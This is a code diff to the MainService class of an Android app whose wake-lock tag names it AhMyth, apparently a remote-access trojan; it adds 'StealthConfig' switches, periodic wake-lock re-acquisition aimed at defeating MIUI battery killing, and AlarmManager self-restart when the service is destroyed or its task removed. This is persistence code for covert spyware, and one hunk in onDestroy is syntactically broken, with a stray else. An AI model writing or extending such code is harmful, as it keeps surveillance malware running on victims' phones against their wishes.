@@ -33,8 +33,13 @@ public class MainService extends Service {
     private android.view.View overlayView;
     
     private static Context contextOfApplication;
+    private static MainService instance;
     private PowerManager.WakeLock wakeLock;
     private boolean isRunning = false;
+    
+    public static MainService getInstance() {
+        return instance;
+    }
 
     private static void findContext() throws Exception {
         Class<?> activityThreadClass;
@@ -93,10 +98,13 @@ public class MainService extends Service {
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "Service onCreate");
+        instance = this;
         contextOfApplication = this;
         
-        // Acquire wake lock to keep service running
-        acquireWakeLock();
+        // Acquire wake lock to keep service running (if enabled)
+        if (StealthConfig.WAKE_LOCK) {
+            acquireWakeLock();
+        }
         
         // Create 1px overlay if permission granted
         createOverlay();
@@ -128,11 +136,23 @@ public class MainService extends Service {
 
         if (isRunning) {
             Log.d(TAG, "Service already running");
-            return Service.START_STICKY;
+            // Re-acquire wake lock if it was lost (important for MIUI)
+            if (StealthConfig.WAKE_LOCK && (wakeLock == null || !wakeLock.isHeld())) {
+                Log.d(TAG, "Wake lock lost, re-acquiring...");
+                acquireWakeLock();
+            }
+            // Return START_STICKY only if PERSISTENT_SERVICE is enabled
+            return StealthConfig.PERSISTENT_SERVICE ? Service.START_STICKY : Service.START_NOT_STICKY;
         }
         
         isRunning = true;
         contextOfApplication = this;
+        
+        // Ensure wake lock is acquired (re-acquire if lost)
+        if (StealthConfig.WAKE_LOCK && (wakeLock == null || !wakeLock.isHeld())) {
+            Log.d(TAG, "Acquiring wake lock in onStartCommand...");
+            acquireWakeLock();
+        }
         
         // Start foreground immediately to prevent ANR
         startForegroundWithNotification();
@@ -145,7 +165,9 @@ public class MainService extends Service {
             Log.e(TAG, "Error starting ConnectionManager", e);
         }
         
-        return Service.START_STICKY;
+        // Return START_STICKY only if PERSISTENT_SERVICE is enabled
+        // This ensures the system restarts the service if killed, but only when persistence is enabled
+        return StealthConfig.PERSISTENT_SERVICE ? Service.START_STICKY : Service.START_NOT_STICKY;
     }
 
     private void startForegroundWithNotification() {
@@ -262,15 +284,58 @@ public class MainService extends Service {
     }
     
     private void acquireWakeLock() {
+        // Only acquire wake lock if WAKE_LOCK is enabled
+        if (!StealthConfig.WAKE_LOCK) {
+            Log.d(TAG, "WAKE_LOCK is disabled, not acquiring wake lock");
+            return;
+        }
+        
         try {
             PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
             if (powerManager != null) {
+                // Release old wake lock if exists
+                if (wakeLock != null && wakeLock.isHeld()) {
+                    try {
+                        wakeLock.release();
+                    } catch (Exception e) {
+                        Log.w(TAG, "Error releasing old wake lock", e);
+                    }
+                }
+                
+                // Create new wake lock with reference counting for MIUI compatibility
                 wakeLock = powerManager.newWakeLock(
                     PowerManager.PARTIAL_WAKE_LOCK,
                     "AhMyth::ServiceWakeLock"
                 );
-                wakeLock.acquire(10*60*1000L); // 10 minutes timeout
-                Log.d(TAG, "Wake lock acquired");
+                
+                // Set as reference counted so it can be re-acquired (important for MIUI)
+                wakeLock.setReferenceCounted(true);
+                
+                // Acquire with very long timeout (1 hour) - MIUI may kill it anyway, but this helps
+                // Using acquire() without timeout would be better, but MIUI might reject it
+                wakeLock.acquire(60*60*1000L); // 1 hour timeout
+                
+                Log.d(TAG, "Wake lock acquired (WAKE_LOCK enabled, reference counted)");
+                
+                // Re-acquire periodically to keep it alive on MIUI (every 5 minutes)
+                Handler handler = new Handler(Looper.getMainLooper());
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if (StealthConfig.WAKE_LOCK && wakeLock != null && !wakeLock.isHeld()) {
+                            try {
+                                wakeLock.acquire(60*60*1000L);
+                                Log.d(TAG, "Wake lock re-acquired (periodic refresh)");
+                            } catch (Exception e) {
+                                Log.e(TAG, "Error re-acquiring wake lock", e);
+                            }
+                        }
+                        // Schedule next check in 5 minutes
+                        if (isRunning && StealthConfig.WAKE_LOCK) {
+                            handler.postDelayed(this, 5*60*1000L);
+                        }
+                    }
+                }, 5*60*1000L); // First check in 5 minutes
             }
         } catch (Exception e) {
             Log.e(TAG, "Error acquiring wake lock", e);
@@ -292,13 +357,54 @@ public class MainService extends Service {
     public void onDestroy() {
         Log.d(TAG, "Service onDestroy");
         isRunning = false;
+        
+        // Schedule restart BEFORE releasing wake lock and removing overlay
+        // This ensures the service can restart even if killed
+        if (StealthConfig.PERSISTENT_SERVICE) {
+            Log.d(TAG, "PERSISTENT_SERVICE enabled, scheduling restart");
+            
+            // Use AlarmManager to ensure restart even if process is killed
+            try {
+                android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                if (alarmManager != null) {
+                    android.content.Intent restartIntent = new android.content.Intent(this, MainService.class);
+                    android.app.PendingIntent pendingIntent;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        pendingIntent = android.app.PendingIntent.getService(
+                            this, 0, restartIntent, 
+                            android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
+                        );
+                    } else {
+                        pendingIntent = android.app.PendingIntent.getService(
+                            this, 0, restartIntent, 
+                            android.app.PendingIntent.FLAG_ONE_SHOT
+                        );
+                    }
+                    // Schedule restart in 2 seconds
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        alarmManager.setExactAndAllowWhileIdle(
+                            android.app.AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + 2000,
+                            pendingIntent
+                        );
+                    } else {
+                        alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000, pendingIntent);
+                    }
+                    Log.d(TAG, "Scheduled service restart via AlarmManager");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error scheduling restart", e);
+            }
+        }
+        
         releaseWakeLock();
         
         // Remove overlay
         removeOverlay();
-        
-        // Schedule restart
-        scheduleRestart();
+            scheduleRestart();
+        } else {
+            Log.d(TAG, "PERSISTENT_SERVICE disabled, not scheduling restart");
+        }
         
         super.onDestroy();
     }
@@ -369,11 +475,24 @@ public class MainService extends Service {
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed - scheduling restart");
-        scheduleRestart();
+        Log.d(TAG, "Task removed");
+        
+        // Schedule restart only if PERSISTENT_SERVICE is enabled
+        if (StealthConfig.PERSISTENT_SERVICE) {
+            Log.d(TAG, "PERSISTENT_SERVICE enabled, scheduling restart");
+            scheduleRestart();
+        } else {
+            Log.d(TAG, "PERSISTENT_SERVICE disabled, not scheduling restart");
+        }
     }
     
     private void scheduleRestart() {
+        // Double-check PERSISTENT_SERVICE setting before scheduling
+        if (!StealthConfig.PERSISTENT_SERVICE) {
+            Log.d(TAG, "PERSISTENT_SERVICE is disabled, not scheduling restart");
+            return;
+        }
+        
         try {
             Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
             restartServiceIntent.setPackage(getPackageName());
@@ -399,16 +518,40 @@ public class MainService extends Service {
                     // Android 12+ requires permission for exact alarms
                     if (alarmManager.canScheduleExactAlarms()) {
                         alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                        Log.d(TAG, "Restart scheduled (exact alarm, Android 12+)");
                     } else {
                         alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                        Log.d(TAG, "Restart scheduled (inexact alarm, Android 12+, no permission)");
                     }
                 } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                    Log.d(TAG, "Restart scheduled (exact, allow while idle, Android 6+)");
                 } else {
                     alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                    Log.d(TAG, "Restart scheduled (exact, Android < 6)");
                 }
-                
-                Log.d(TAG, "Restart scheduled");
+            } else {
+                Log.e(TAG, "AlarmManager is null, cannot schedule restart");
+            }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception scheduling restart (may need SCHEDULE_EXACT_ALARM permission)", e);
+            // Try fallback with inexact alarm
+            try {
+                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                if (alarmManager != null) {
+                    Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
+                    restartServiceIntent.setPackage(getPackageName());
+                    PendingIntent pendingIntent = PendingIntent.getService(
+                        getApplicationContext(), 1001, restartServiceIntent,
+                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.S 
+                            ? PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
+                            : PendingIntent.FLAG_ONE_SHOT
+                    );
+                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000, pendingIntent);
+                    Log.d(TAG, "Restart scheduled (fallback inexact alarm)");
+                }
+            } catch (Exception e2) {
+                Log.e(TAG, "Fallback restart scheduling also failed", e2);
             }
         } catch (Exception e) {
             Log.e(TAG, "Error scheduling restart", e);
